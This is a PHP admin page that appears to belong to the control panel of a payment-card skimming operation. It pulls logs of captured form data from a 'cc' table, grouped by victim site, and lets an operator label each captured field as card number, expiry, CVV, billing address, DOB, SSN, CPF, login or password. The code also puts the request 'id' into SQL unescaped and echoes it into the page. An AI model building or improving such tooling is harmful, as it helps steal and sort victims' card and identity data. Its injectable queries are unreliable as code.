<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Details Page</title>
    <link href="../js/tailwind.min.css" rel="stylesheet">
    <style>
        .bg-navy { background-color: #1a1a1a; }
        .border-gold { border-color: #2f2e2c; }
        .text-gold { color: #d4af37; }
    </style>
</head>
<body class="bg-navy text-gold">
    <div class="container mx-auto px-4 py-8">
        <div class="text-center mb-8">
            <a href="../cards.php?sort=id&order=desc" class="bg-yellow-500 hover:bg-yellow-600 text-black font-bold py-2 px-4 rounded">Back to CARDS</a>
        </div>

        <?php

session_start();

if (!isset($_SESSION['user_logged_in'])) {
    header('Location: ../login.php');
    exit();
}

// Проверка роли пользователя
if (!isset($_SESSION['user_role']) || $_SESSION['user_role'] !== 'admin') {
    header('Location: ../dashboard.php');
    exit();
}
        require 'config.php'; 

        $id = isset($_GET['id']) ? $_GET['id'] : null;
        $url_id = isset($_GET['url_id']) ? $_GET['url_id'] : null;

        $query = "SELECT fulldatalog FROM cc WHERE id = '$id'";
        $result = $db->query($query);

        if ($result && $row = $result->fetch_assoc()) {
            echo "<h2 class='text-2xl font-bold mb-4'>Full Data Log for ID: $id SITE:  $url_id</h2>";
            
            $dataLog = json_decode($row['fulldatalog'], true);

            if (is_array($dataLog)) {
                echo "<form action='processSelection.php' method='post' class='mb-8'>";
                echo "<input type='hidden' name='id' value='$id'>";

                echo "<div class='mb-4'>";
                echo "<label class='block mb-2'>Select Field for Assignment:</label>";
                echo "<select name='field' class='w-full p-2 bg-gray-800 border border-gold rounded'>";
                foreach ($dataLog as $entry) {
                    if (strpos($entry, ':') !== false) {
                        list($key, $value) = explode(':', $entry, 2);
                        echo "<option value='".htmlspecialchars(trim($key))."'>".htmlspecialchars(trim($key))." (".htmlspecialchars(trim($value)).")</option>";
                    }
                }
                echo "</select>";
                echo "</div>";

                echo "<div class='mb-4'>";
                echo "<label class='block mb-2'>Assign As:</label>";
                echo "<select name='assign_as' class='w-full p-2 bg-gray-800 border border-gold rounded'>";
                echo "<option value='payment_cc_number'>CC Number</option>";
                echo "<option value='payment_cc_exp_month'>Exp Month</option>";
                echo "<option value='payment_cc_exp_year'>Exp Year</option>";
                echo "<option value='payment_cc_cid'>CID</option>";
                echo "<option value='billing_firstname'>First Name</option>";
                echo "<option value='billing_lastname'>Last Name</option>";
                echo "<option value='payment_cc_owner'>Owner</option>";
                echo "<option value='billing_country_id'>Country ID</option>";
                echo "<option value='billing_state'>State</option>";
                echo "<option value='billing_city'>City</option>";
                echo "<option value='billing_street'>Street</option>";
                echo "<option value='billing_postcode'>Postcode</option>";
                echo "<option value='billing_email'>Email</option>";
                echo "<option value='billing_telephone'>Telephone</option>";
				echo "<option value='DOB'>DOB</option>";
				echo "<option value='SSN'>SSN</option>";
				echo "<option value='CPF'>CPF</option>";
				echo "<option value='Other'>Other</option>";
				echo "<option value='login'>Login</option>";
                echo "<option value='password'>Password</option>";
                echo "</select>";
                echo "</div>";

                echo "<div class='flex justify-center space-x-4'>";
                echo "<input type='submit' name='action' value='Assign' class='bg-green-500 hover:bg-green-600 text-white font-bold py-2 px-4 rounded'>";
                echo "<input type='submit' name='action' value='Block' class='bg-red-500 hover:bg-red-600 text-white font-bold py-2 px-4 rounded'>";
                echo "</div>";
                echo "</form>";

                $url_id = isset($_GET['url_id']) ? $db->real_escape_string($_GET['url_id']) : null;

                if ($url_id) {
                    $query = "SELECT field_key, assign_as, block FROM field_mappings WHERE url_id = '$url_id'";
                    $result = $db->query($query);

                    if ($result && $result->num_rows > 0) {
                        echo "<h3 class='text-xl font-bold mb-4'>Field Mappings for URL ID: $url_id</h3>";
                        echo "<table class='w-full bg-gray-800 rounded'>";
                        echo "<tr class='bg-gray-700 text-white'><th class='px-4 py-2'>Field Key</th><th class='px-4 py-2'>Assigned As</th><th class='px-4 py-2'>Blocked</th><th class='px-4 py-2'>Action</th></tr>";

                        while ($row = $result->fetch_assoc()) {
                            echo "<tr>";
                            echo "<td class='border px-4 py-2'>" . htmlspecialchars($row['field_key']) . "</td>";
                            echo "<td class='border px-4 py-2'>" . htmlspecialchars($row['assign_as']) . "</td>";
                            echo "<td class='border px-4 py-2 text-center'>";
                            echo "<form action='updateBlockStatus.php' method='post' class='inline-block'>";
                            echo "<input type='hidden' name='field_key' value='" . htmlspecialchars($row['field_key']) . "'>";
                            echo "<input type='hidden' name='url_id' value='" . htmlspecialchars($url_id) . "'>";
                            echo "<input type='hidden' name='id' value='" . htmlspecialchars($id) . "'>";
                            echo "<select name='block_status' onchange='this.form.submit()' class='bg-gray-800 text-gold border border-gold rounded'>";
                            echo "<option value='0'" . ($row['block'] ? "" : " selected") . ">No</option>";
                            echo "<option value='1'" . ($row['block'] ? " selected" : "") . ">Yes</option>";
                            echo "</select>";
                            echo "</form>";
                            echo "</td>";

                            echo "<td class='border px-4 py-2 text-center'><a href='deleteFieldMapping.php?id=" . $id . "&url_id=" . urlencode($url_id) . "&field_key=" . urlencode($row['field_key']) . "' class='text-red-500 hover:text-red-600'>Delete</a></td>";

                            echo "</tr>";
                        }

                        echo "</table>";
                    } else {
                        echo "<p>No field mappings found for this URL ID.</p>";
                    }
                } else {
                    echo "<p>URL ID not specified.</p>";
                }
            } else {
                echo "No data found for this ID.";
            }
        } else {
            echo "No data found for this ID.";
        }

        $db->close();
        ?>
    </div>
</body>
</html>